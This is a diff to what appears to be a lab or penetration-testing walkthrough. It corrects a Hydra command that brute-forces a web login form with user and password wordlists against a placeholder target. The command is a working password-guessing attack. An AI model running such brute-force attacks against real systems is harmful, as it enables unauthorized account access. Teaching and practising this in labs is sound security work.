@@ -18,7 +18,7 @@
 
 - With the required values in hand, launch the attack using Hydra:
 ```bash
-hydra -L <user-file> -P <pass-file> <target-ip> http-post "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:<invalid-credential-message>"
+hydra -L <user-file> -P <pass-file> <target-ip> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:<invalid-credential-message>"
 ```
   
   - Customise the parameters in the `http-post` section based on the identified values from step 2.
